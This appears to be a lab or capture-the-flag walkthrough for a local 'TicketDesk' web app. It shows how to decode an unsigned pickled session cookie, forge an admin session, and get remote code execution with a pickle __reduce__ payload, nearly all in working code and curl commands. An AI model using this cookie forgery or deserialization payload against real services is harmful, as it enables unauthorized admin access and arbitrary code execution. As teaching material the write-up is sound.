# Finding the Bug

## Identify the application

Connect to the target:

```bash
curl -v http://127.0.0.1:8082/login
```

The response is a standard HTML login form for "TicketDesk". There are no obvious hints in the page source about credentials or vulnerabilities.

## Log in as a regular user and get a session cookie

```bash
curl -v -c /tmp/jar -X POST http://127.0.0.1:8082/login \
  -d "username=alice&password=alice123"
```

The response sets a `session` cookie. Capture it:

```bash
grep session /tmp/jar
```

The cookie value is a long base64 string.

## Decode the session cookie

```python
import pickle, base64

raw = "<paste cookie value here>"
data = pickle.loads(base64.b64decode(raw))
print(data)
```

Output:

```python
{'username': 'alice', 'role': 'user'}
```

The session is a pickled dict. There is no signature or integrity check.

## Confirm you can forge a session

Build a cookie with `role: admin`:

```python
import pickle, base64
forged = base64.b64encode(pickle.dumps({"username": "alice", "role": "admin"})).decode()
print(forged)
```

Send it:

```bash
curl -b "session=$FORGED" http://127.0.0.1:8082/admin
```

The admin panel loads. The server accepted the forged cookie as a valid admin session, with no code execution required.

## Confirm RCE via __reduce__

The server unpickles whatever you send. Build a payload that calls a system function:

```python
import pickle, subprocess, base64

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['id'],))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

Send it:

```bash
curl -b "session=$PAYLOAD" http://127.0.0.1:8082/
```

The response page contains a "Server output" block with the output of `id`. Remote code execution confirmed.
